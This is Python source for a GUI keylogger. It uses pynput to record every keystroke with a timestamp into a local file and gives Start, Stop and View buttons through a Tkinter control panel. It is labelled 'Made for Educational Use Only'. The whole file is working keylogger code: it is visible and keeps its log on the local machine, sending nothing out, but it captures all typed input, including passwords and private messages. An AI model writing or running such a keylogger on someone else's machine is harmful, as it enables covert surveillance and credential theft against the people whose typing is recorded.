import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Listener
from datetime import datetime
import threading
import os
import subprocess

log_file = "key_log.txt"
listener = None
listener_thread = None
is_listening = False

def write_log(key):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        log_entry = f"{time} - {key.char}\n"
    except AttributeError:
        log_entry = f"{time} - [{key}]\n"

    with open(log_file, "a") as file:
        file.write(log_entry)

def start_keylogger():
    global listener, listener_thread, is_listening
    if is_listening:
        messagebox.showinfo("Already Running", "Keylogger is already running.")
        return

    def run_listener():
        global listener
        listener = Listener(on_press=write_log)
        listener.start()
        listener.join()

    listener_thread = threading.Thread(target=run_listener, daemon=True)
    listener_thread.start()
    is_listening = True
    messagebox.showinfo("Started", "Keylogger started!")

def stop_keylogger():
    global listener, is_listening
    if listener:
        listener.stop()
        listener = None
        is_listening = False
        messagebox.showinfo("Stopped", "Keylogger stopped!")
    else:
        messagebox.showinfo("Not Running", "Keylogger is not running.")

def view_logs():
    if os.path.exists(log_file):
        if os.name == 'nt':
            os.startfile(log_file)  # Windows
        else:
            subprocess.call(['xdg-open', log_file])  # Linux
    else:
        messagebox.showinfo("No Logs", "Log file not found.")

window = tk.Tk()
window.title("Python GUI Keylogger")
window.geometry("500x400")

tk.Label(window, text="Keylogger Control Panel", font=("Arial", 14)).pack(pady=10)

tk.Button(window, text="Start Logging", command=start_keylogger).pack(pady=5)
tk.Button(window, text="Stop Logging", command=stop_keylogger).pack(pady=5)
tk.Button(window, text="View Log File", command=view_logs).pack(pady=5)

tk.Label(window, text="Made for Educational Use Only", fg="gray").pack(side="bottom", pady=10)

window.mainloop()